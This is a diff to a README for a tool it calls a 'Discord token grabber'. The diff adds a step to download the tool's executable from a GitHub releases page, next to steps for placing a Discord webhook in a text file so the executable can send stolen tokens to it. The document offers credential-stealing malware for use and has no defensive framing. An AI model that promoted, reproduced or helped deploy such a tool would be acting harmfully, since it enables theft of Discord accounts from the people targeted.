@@ -3,6 +3,7 @@ A small self-patch Discord token grabber
 
 ## Usage
 ### *Without Compiler*
+1. Download `avec.exe` from `https://github.com/juvoy/avec/releases`
 1. Create a text file called `info.txt`
 2. Paste your Discord webhook into the file
 3. Drag the file `info.txt` into `avec.exe`
